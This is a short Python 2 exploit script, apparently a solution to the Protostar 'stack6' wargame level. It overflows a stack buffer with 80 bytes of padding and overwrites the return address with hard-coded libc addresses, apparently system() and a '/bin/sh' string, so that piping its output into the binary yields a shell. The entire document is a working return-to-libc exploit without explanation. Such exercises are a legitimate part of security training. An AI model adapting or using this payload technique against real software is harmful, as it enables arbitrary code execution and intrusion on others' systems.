#!/usr/bin/python
from struct import pack as p
#(python exploit.py ; cat) | ./stack6

pad = "A" * 80
ret = p("I",0xb7ecffb0)
binsh = p("I",0xb7fb63bf)

all = pad + ret + "BBBB" + binsh

print all

